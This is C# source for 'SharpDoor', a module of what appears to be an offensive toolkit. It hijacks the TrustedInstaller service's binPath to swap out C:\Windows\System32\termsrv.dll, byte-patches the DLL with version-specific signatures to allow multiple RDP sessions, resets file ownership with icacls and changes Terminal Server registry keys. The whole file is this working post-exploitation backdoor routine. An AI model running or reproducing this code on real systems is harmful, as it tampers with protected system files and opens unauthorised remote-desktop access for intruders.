using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using TaotieToolkit.config;

namespace TaotieToolkit.modules.systemcontrol
{
    internal class SharpDoor : ICommand, ICommandMarker
    {
        public string Name => "SharpDoor";
        public string Description => "Allowed multiple RDP sessions by patching termsrv.dll file";
        public static byte[] PatchFind = { };
        public static byte[] PatchReplace = {
            0xB8,
            0x00,
            0x01,
            0x00,
            0x00,
            0x89,
            0x81,
            0x38,
            0x06,
            0x00,
            0x00,
            0x90
        };

        public void Execute(string[] args)
        {
            if (!Utils.isAdmin())
            {
                Console.WriteLine("[!] The current session does not have administrative rights.");
                System.Environment.Exit(0);
            }

            try
            {
                string termsrv_src = @"C:\Windows\System32\termsrv.dll";
                FileVersionInfo ver = FileVersionInfo.GetVersionInfo(termsrv_src);
                Console.WriteLine("[*] Termsrv.dll Version : " + ver.ProductVersion);
                TermsrvPatchVersion(ver.ProductVersion);

                Console.WriteLine("[*] Stop termservice");
                Utils.PowerCommand(@"net stop termservice /y");

                Console.WriteLine(@"[*] Backup termsrv.dll to C:\Users\Public\termsrv.dll");

                Utils.PowerCommand("sc config TrustedInstaller binPath= \"cmd /c move C:\\Windows\\System32\\termsrv.dll C:\\Users\\Public\\termsrv.dll\"");
                Utils.PowerCommand("sc start \"TrustedInstaller\"");
                Thread.Sleep(2000);

                Console.WriteLine("\n[*] Attempting to patch termsrv.dll");
                PatchFile(@"C:\Users\Public\termsrv.dll", @"C:\Users\Public\termsrv.patch.dll");
                Thread.Sleep(2000);

                Utils.PowerCommand("sc config TrustedInstaller binPath= \"cmd /c move C:\\Users\\Public\\termsrv.patch.dll C:\\Windows\\System32\\termsrv.dll\"");
                Utils.PowerCommand("sc start \"TrustedInstaller\"");
                Thread.Sleep(2000);

                Utils.PowerCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /setowner \"NT SERVICE\\TrustedInstaller\"");
                Utils.PowerCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /grant \"NT SERVICE\\TrustedInstaller:(RX)\"");

                Console.WriteLine("[*] Setting Registry Terminal Server\\fSingleSessionPerUser to 0");
                RegistryKey reg_key1 = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
                reg_key1.SetValue("fSingleSessionPerUser", 0, RegistryValueKind.DWord);

                Console.WriteLine("[*] Setting Registry Terminal Server\\TSAppAllowList\\fDisabledAllowList to 1");
                RegistryKey reg_key2 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList");
                reg_key2.SetValue("fDisabledAllowList", 1, RegistryValueKind.DWord);

                Console.WriteLine("[*] Start termservice");
                Utils.PowerCommand(@"net start termservice /y");

                Console.WriteLine("[*] Done");
            }
            catch (Exception e)
            {
                Console.WriteLine("\r\n[!] Unhandled SharpDoor exception:\r\n");
                Console.WriteLine(e);
            }

        }
        private static void TermsrvPatchVersion(string termsrvVersion)
        {
            // www.mysysadmintips.com/windows/clients/545-multiple-rdp-remote-desktop-sessions-in-windows-10
            if (termsrvVersion == "10.0.17763.1")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0x7F,
                    0x2C,
                    0x01,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.17763.437")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0x3B,
                    0x2B,
                    0x01,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.17134.1")
            {
                PatchFind = new byte[] {
                    0x8B,
                    0x99,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x8B,
                    0xB9,
                    0x38,
                    0x06,
                    0x00,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.16299.15")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0xB1,
                    0x7D,
                    0x02,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.10240.16384")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0x73,
                    0x42,
                    0x02,
                    0x00
                };
            }
            else if (termsrvVersion == "10.0.10586.0")
            {
                PatchFind = new byte[] {
                    0x39,
                    0x81,
                    0x3C,
                    0x06,
                    0x00,
                    0x00,
                    0x0F,
                    0x84,
                    0x3F,
                    0x42,
                    0x02,
                    0x00
                };
            }
            else
            {
                Console.WriteLine("[!] This version is not supported");
                System.Environment.Exit(0);
            }
        }
        private static void PatchFile(string originalFile, string patchedFile)
        {
            // Ensure target directory exists.
            var targetDirectory = Path.GetDirectoryName(patchedFile);

            // Read file bytes.
            byte[] fileContent = File.ReadAllBytes(originalFile);

            for (int p = 0; p < fileContent.Length; p++)
            {
                bool isPatch = DetectPatch(fileContent, p);
                if (!isPatch) continue;

                for (int w = 0; w < PatchFind.Length; w++)
                {
                    fileContent[p + w] = PatchReplace[w];
                }
            }

            // Save it to another location.
            File.WriteAllBytes(patchedFile, fileContent);

            Console.WriteLine("\nOriginal File Hash : " + Utils.GetMd5Hash(originalFile));
            Console.WriteLine("Patched File Hash : " + Utils.GetMd5Hash(patchedFile));
            Console.WriteLine("\n[*] " + patchedFile + " was patched successfully\n");
        }


        public static bool DetectPatch(byte[] sequence, int position)
        {
            if (position + PatchFind.Length > sequence.Length) return false;
            for (int p = 0; p < PatchFind.Length; p++)
            {
                if (PatchFind[p] != sequence[position + p]) return false;
            }
            return true;
        }
    }
}
